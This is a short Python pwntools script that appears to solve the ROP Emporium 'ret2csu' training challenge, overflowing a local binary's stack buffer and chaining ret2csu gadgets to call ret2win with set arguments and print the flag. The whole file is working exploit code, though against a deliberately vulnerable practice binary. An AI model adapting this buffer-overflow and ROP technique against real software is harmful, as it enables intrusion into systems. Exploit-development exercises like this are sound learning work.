from pwn import *

elf = ELF("ret2csu")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x98
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

def main():
    rop = ROP(elf)
    rop.raw(cyclic(BUFFER_SIZE + context.bytes))
    rop.ret2csu(0, 0xcafebabecafebabe, 0xd00df00dd00df00d)
    rop.rdi = 0xdeadbeefdeadbeef # csu can only set edi, not rdi
    rop.call(elf.symbols.ret2win)
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
